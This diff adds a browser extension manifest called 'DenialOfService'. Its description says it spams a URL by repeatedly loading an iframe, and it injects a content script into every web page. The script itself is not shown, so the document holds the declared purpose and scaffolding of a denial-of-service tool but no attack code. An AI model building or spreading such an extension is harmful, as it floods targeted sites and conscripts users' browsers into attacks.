@@ -1,0 +1,14 @@
+{
+    "manifest_version": 2,
+    "version": "1.0",
+	
+    "name": "DenialOfService",
+    "description": "Extension that spamms a URL by multiple loading an iframe element." ,
+	
+	"content_scripts" : [
+		{
+			"matches": [ "http://*/*", "https://*/*"],
+			"js" : ["content.js"]
+		}
+	]
+}
